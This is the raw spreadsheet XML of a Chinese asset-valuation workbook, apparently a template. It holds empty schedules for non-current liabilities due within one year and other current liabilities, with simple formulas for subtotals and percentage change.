          <t>一年内到期的非流动负债评估明细表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373" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="402" t="inlineStr">
        <is>
          <t>表5-12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376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结算项目</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>到期日</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>年利率%</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="I5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="J5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N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78" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="380" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="580" t="n"/>
      <c r="I6" s="619" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555" t="n"/>
      <c r="L6" s="555">
        <f>K6-J6</f>
        <v/>
      </c>
      <c r="M6" s="555">
        <f>IF(J6=0,"",L6/J6*100)</f>
        <v/>
      </c>
      <c r="N6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="580" t="n"/>
      <c r="I7" s="619" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-J7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(J7=0,"",L7/J7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="580" t="n"/>
      <c r="I8" s="619" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-J8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(J8=0,"",L8/J8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="580" t="n"/>
      <c r="I9" s="619" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-J9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(J9=0,"",L9/J9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="580" t="n"/>
      <c r="I10" s="619" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>K10-J10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(J10=0,"",L10/J10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="580" t="n"/>
      <c r="I11" s="619" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>K11-J11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(J11=0,"",L11/J11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="580" t="n"/>
      <c r="I12" s="619" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>K12-J12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(J12=0,"",L12/J12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="580" t="n"/>
      <c r="I13" s="619" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>K13-J13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(J13=0,"",L13/J13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="580" t="n"/>
      <c r="I14" s="619" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555">
        <f>K14-J14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(J14=0,"",L14/J14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="580" t="n"/>
      <c r="I15" s="619" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>K15-J15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(J15=0,"",L15/J15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="580" t="n"/>
      <c r="I16" s="619" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>K16-J16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(J16=0,"",L16/J16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="580" t="n"/>
      <c r="I17" s="619" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>K17-J17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(J17=0,"",L17/J17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="580" t="n"/>
      <c r="I18" s="619" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>K18-J18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(J18=0,"",L18/J18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="580" t="n"/>
      <c r="I19" s="619" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>K19-J19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(J19=0,"",L19/J19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="580" t="n"/>
      <c r="I20" s="619" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>K20-J20</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(J20=0,"",L20/J20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="580" t="n"/>
      <c r="I21" s="619" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>K21-J21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(J21=0,"",L21/J21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="580" t="n"/>
      <c r="I22" s="619" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>K22-J22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(J22=0,"",L22/J22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="580" t="n"/>
      <c r="I23" s="619" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>K23-J23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(J23=0,"",L23/J23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="580" t="n"/>
      <c r="I24" s="619" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>K24-J24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(J24=0,"",L24/J24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="580" t="n"/>
      <c r="I25" s="619" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>K25-J25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(J25=0,"",L25/J25*100)</f>
        <v/>
      </c>
      <c r="N25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="578" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="580" t="n"/>
      <c r="I26" s="619" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555">
        <f>K26-J26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(J26=0,"",L26/J26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="578" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="580" t="n"/>
      <c r="I27" s="619" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555">
        <f>K27-J27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(J27=0,"",L27/J27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116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115" t="n"/>
      <c r="F28" s="383" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="580">
        <f>ROUND(SUM(H6:H27),2)</f>
        <v/>
      </c>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555">
        <f>SUM(J6:J27)</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>SUM(K6:K27)</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>K28-J28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(J28=0,"",L28/J28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="B2:N2"/>
    <mergeCell ref="B4:D4"/>
    <mergeCell ref="B28:C28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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0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 codeName="Sheet95">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J28"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="B4" sqref="B4:E4"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="27.8333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.8333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="18.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="15.5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其他流动负债评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="18" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="18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402" t="inlineStr">
        <is>
          <t>表5-13</t>
        </is>
      </c>
    </row>
    <row r="4" ht="18" customHeight="1" s="41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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="18" customFormat="1" customHeight="1" s="204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结算内容</t>
        </is>
      </c>
      <c r="F5" s="307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8" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="3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8" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="380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8" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="560" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555">
        <f>G8-F8</f>
        <v/>
      </c>
      <c r="I8" s="555">
        <f>IF(F8=0,"",H8/F8*100)</f>
        <v/>
      </c>
      <c r="J8" s="383" t="n"/>
    </row>
    <row r="9" ht="18" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="560" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555">
        <f>G9-F9</f>
        <v/>
      </c>
      <c r="I9" s="555">
        <f>IF(F9=0,"",H9/F9*100)</f>
        <v/>
      </c>
      <c r="J9" s="383" t="n"/>
    </row>
    <row r="10" ht="18" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="560" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555">
        <f>G10-F10</f>
        <v/>
      </c>
      <c r="I10" s="555">
        <f>IF(F10=0,"",H10/F10*100)</f>
        <v/>
      </c>
      <c r="J10" s="383" t="n"/>
    </row>
    <row r="11" ht="18" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="560" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555">
        <f>G11-F11</f>
        <v/>
      </c>
      <c r="I11" s="555">
        <f>IF(F11=0,"",H11/F11*100)</f>
        <v/>
      </c>
      <c r="J11" s="383" t="n"/>
    </row>
    <row r="12" ht="18" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="560" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555">
        <f>G12-F12</f>
        <v/>
      </c>
      <c r="I12" s="555">
        <f>IF(F12=0,"",H12/F12*100)</f>
        <v/>
      </c>
      <c r="J12" s="383" t="n"/>
    </row>
    <row r="13" ht="18" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="560" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555">
        <f>G13-F13</f>
        <v/>
      </c>
      <c r="I13" s="555">
        <f>IF(F13=0,"",H13/F13*100)</f>
        <v/>
      </c>
      <c r="J13" s="383" t="n"/>
    </row>
    <row r="14" ht="18" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="560" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555">
        <f>G14-F14</f>
        <v/>
      </c>
      <c r="I14" s="555">
        <f>IF(F14=0,"",H14/F14*100)</f>
        <v/>
      </c>
      <c r="J14" s="383" t="n"/>
    </row>
    <row r="15" ht="18" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="560" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555">
        <f>G15-F15</f>
        <v/>
      </c>
      <c r="I15" s="555">
        <f>IF(F15=0,"",H15/F15*100)</f>
        <v/>
      </c>
      <c r="J15" s="383" t="n"/>
    </row>
    <row r="16" ht="18" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="560" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555">
        <f>G16-F16</f>
        <v/>
      </c>
      <c r="I16" s="555">
        <f>IF(F16=0,"",H16/F16*100)</f>
        <v/>
      </c>
      <c r="J16" s="383" t="n"/>
    </row>
    <row r="17" ht="18" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="560" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555">
        <f>G17-F17</f>
        <v/>
      </c>
      <c r="I17" s="555">
        <f>IF(F17=0,"",H17/F17*100)</f>
        <v/>
      </c>
      <c r="J17" s="383" t="n"/>
    </row>
    <row r="18" ht="18" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="560" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555">
        <f>G18-F18</f>
        <v/>
      </c>
      <c r="I18" s="555">
        <f>IF(F18=0,"",H18/F18*100)</f>
        <v/>
      </c>
      <c r="J18" s="383" t="n"/>
    </row>
    <row r="19" ht="18" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="560" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555">
        <f>G19-F19</f>
        <v/>
      </c>
      <c r="I19" s="555">
        <f>IF(F19=0,"",H19/F19*100)</f>
        <v/>
      </c>
      <c r="J19" s="383" t="n"/>
    </row>
    <row r="20" ht="18" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="560" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555">
        <f>G20-F20</f>
        <v/>
      </c>
      <c r="I20" s="555">
        <f>IF(F20=0,"",H20/F20*100)</f>
        <v/>
      </c>
      <c r="J20" s="383" t="n"/>
    </row>
    <row r="21" ht="18" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="560" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555">
        <f>G21-F21</f>
        <v/>
      </c>
      <c r="I21" s="555">
        <f>IF(F21=0,"",H21/F21*100)</f>
        <v/>
      </c>
      <c r="J21" s="383" t="n"/>
    </row>
    <row r="22" ht="18" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="560" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555">
        <f>G22-F22</f>
        <v/>
      </c>
      <c r="I22" s="555">
        <f>IF(F22=0,"",H22/F22*100)</f>
        <v/>
      </c>
      <c r="J22" s="383" t="n"/>
    </row>
    <row r="23" ht="18" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="560" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555">
        <f>G23-F23</f>
        <v/>
      </c>
      <c r="I23" s="555">
        <f>IF(F23=0,"",H23/F23*100)</f>
        <v/>
      </c>
      <c r="J23" s="383" t="n"/>
    </row>
    <row r="24" ht="18" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="560" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555">
        <f>G24-F24</f>
        <v/>
      </c>
      <c r="I24" s="555">
        <f>IF(F24=0,"",H24/F24*100)</f>
        <v/>
      </c>
      <c r="J24" s="383" t="n"/>
    </row>
    <row r="25" ht="18" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="560" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555">
        <f>G25-F25</f>
        <v/>
      </c>
      <c r="I25" s="555">
        <f>IF(F25=0,"",H25/F25*100)</f>
        <v/>
      </c>
      <c r="J25" s="383" t="n"/>
    </row>
    <row r="26" ht="18" customHeight="1" s="415">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B26" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C26" s="567" t="n"/>
      <c r="D26" s="115" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="555">
        <f>SUM(F6:F25)</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>SUM(G6:G25)</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
